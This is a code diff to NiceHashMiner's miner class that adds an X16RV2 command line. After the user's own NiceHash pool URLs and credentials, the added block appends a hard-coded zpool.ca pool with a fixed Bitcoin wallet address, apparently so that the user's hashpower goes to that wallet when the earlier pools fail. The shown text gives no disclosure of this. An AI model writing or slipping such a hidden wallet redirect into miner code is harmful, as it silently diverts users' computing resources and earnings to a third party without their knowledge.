@@ -108,6 +108,24 @@ namespace NiceHashMiner.Miners
                                   DeviceType.NVIDIA) +
                               " --no-color --devices ";
             }
+            if (MiningSetup.CurrentAlgorithmType.Equals(AlgorithmType.X16RV2))
+            {
+                commandLine = " --algo=" + algorithm.MinerName +
+                " --url=" + url + " --userpass=" + username + ":x" +
+                " --url=stratum+tcp://" + alg + "." + myServers[1, 0] + nhsuff + ".nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
+                " --url=stratum+tcp://" + alg + "." + myServers[2, 0] + nhsuff + ".nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
+                " --url=stratum+tcp://" + alg + "." + myServers[3, 0] + nhsuff + ".nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
+                " --url=stratum+tcp://" + alg + "." + myServers[4, 0] + nhsuff + ".nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
+                " --url=stratum+tcp://" + alg + "." + myServers[5, 0] + nhsuff + ".nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
+                " --url=stratum+tcp://" + alg + "." + myServers[0, 0] + nhsuff + ".nicehash.com:" + port + " --userpass=" + username + ":x" +
+                " --url=" + url + " --userpass=" + username + ":x" +
+                " --url=stratum+tcp://x16rv2.eu.mine.zpool.ca:3637" + " --userpass=1JqFnUR3nDFCbNUmWiQ4jX6HRugGzX55L2:c=BTC " +
+                              timeLimit + " " +
+                              ExtraLaunchParametersParser.ParseForMiningSetup(
+                                  MiningSetup,
+                                  DeviceType.NVIDIA) +
+                              " --no-color --devices ";
+            }
             if (MiningSetup.CurrentAlgorithmType.Equals(AlgorithmType.Skunk))
             {
                 commandLine = " --algo=" + algorithm.MinerName +
